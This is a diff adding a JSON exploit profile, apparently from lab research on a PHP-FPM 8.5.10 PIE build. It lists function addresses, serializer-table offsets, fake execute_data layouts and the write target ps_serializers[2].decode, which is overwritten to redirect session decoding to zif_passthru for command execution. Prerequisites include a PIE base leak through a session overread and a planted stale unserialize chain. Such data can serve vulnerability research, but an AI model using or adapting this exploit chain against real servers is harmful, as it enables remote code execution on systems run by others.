@@ -1,0 +1,123 @@
+{
+ "name": "php8pie-8510-minimal-pie",
+ "lane": "fpm",
+ "stage": "G6-pie",
+ "status": "private lab PIE build; ASLR on; base leaked in-band",
+ "php_version": "8.5.10",
+ "binary": "/tmp/opencode/research/php8pie_20261022_0325/src/php-8.5.10/sapi/fpm/php-fpm",
+ "build_id": "69ef9c150adebfd8c7409304eef1dc9ddabc2810",
+ "md5": "605064570c308c1eaca5aa5911799ef0",
+ "size_bytes": 42328800,
+ "elf_type": "DYN",
+ "pie": true,
+ "align16": true,
+ "image_base": "0x0",
+ "serializer": "php_binary",
+ "zif_system": "0x464c05",
+ "zif_passthru": "0x464c15",
+ "php_exec": "0x464777",
+ "php_exec_ex": "0x464993",
+ "zif_route": {
+  "decode_slot": "ps_serializers[2].decode",
+  "symbol_verification": "nm -an on the unstripped PIE build; zif_passthru = zif_system + 0x10",
+  "zif_passthru": {
+   "address": "0x464c15",
+   "php_exec_type": 3,
+   "behavior": "clean: type 3 never writes return_value"
+  },
+  "fake_execute_data": {
+   "base": "ZSTR_VAL(data) = X2 + 0x18",
+   "num_args_off": "0x2c",
+   "num_args": 1,
+   "arg1_value_off": "0x50",
+   "arg1_type_off": "0x58",
+   "arg1_type": 6,
+   "zend_string_len_off": "0x10",
+   "zend_string_val_off": "0x18"
+  }
+ },
+ "structs": {
+  "ps_serializer_size": 24,
+  "ps_serializer_name": 0,
+  "ps_serializer_encode": 8,
+  "ps_serializer_decode": 16,
+  "ps_globals_serializer": "0x160",
+  "php_unserialize_data_size": 8216,
+  "php_unserialize_data_last": 0,
+  "php_unserialize_data_first_dtor": 8,
+  "php_unserialize_data_last_dtor": 16,
+  "php_unserialize_data_max_depth": 48,
+  "php_unserialize_data_entries": 56,
+  "var_dtor_entries_size": 4096,
+  "var_dtor_entries_used_slots": 0,
+  "var_dtor_entries_next": 8,
+  "var_dtor_entries_data": 16,
+  "var_entries_max": 1018,
+  "var_dtor_entries_max": 255
+ },
+ "ps_globals": "0x10c5e20",
+ "ps_serializers": {
+  "table": "0x10c1940",
+  "terminator": "0x10c1988",
+  "active_serializer_slot": "0x10c5f80",
+  "active_serializer_ps_globals_offset": "0x160",
+  "default_target": "0x10c1980",
+  "default_handler": "php_binary",
+  "default_php_decode": "0x10c1968",
+  "default_php_decode_16b_aligned": false,
+  "entries": [
+   {
+    "index": 0,
+    "name": "php_serialize",
+    "name_addr": "0x10c1940",
+    "encode": "0x10c1948",
+    "decode": "0x10c1950",
+    "decode_16b_aligned": true
+   },
+   {
+    "index": 1,
+    "name": "php",
+    "name_addr": "0x10c1958",
+    "encode": "0x10c1960",
+    "decode": "0x10c1968",
+    "decode_16b_aligned": false
+   },
+   {
+    "index": 2,
+    "name": "php_binary",
+    "name_addr": "0x10c1970",
+    "encode": "0x10c1978",
+    "decode": "0x10c1980",
+    "decode_16b_aligned": true
+   }
+  ]
+ },
+ "decode_call": {
+  "php_session_decode": "0x4119de",
+  "call_form": "call *0x10(%rax)",
+  "rdi": "ZSTR_VAL session record",
+  "rsi": "ZSTR_LEN session record"
+ },
+ "record": {
+  "format": "php_binary",
+  "builder": "php_binary_zif",
+  "lab_geometry": {
+   "X": "0x7f65f526a000",
+   "P": "0x7f65f5282000",
+   "B0": "0x7f65f5285000",
+   "total": 131014
+  }
+ },
+ "prerequisites": [
+  "PIE base known (leaked via the session overread)",
+  "stale BG(unserialize) chain planted by a bailout request on the same worker",
+  "worker-local .data poison; fresh worker resets it"
+ ],
+ "caveats": [
+  "private lab only; not a universal exploit",
+  "write target is 16-byte aligned ps_serializers[2].decode"
+ ],
+ "receipts": {
+  "pie8": "php8pie_20261022_0325"
+ }
+}
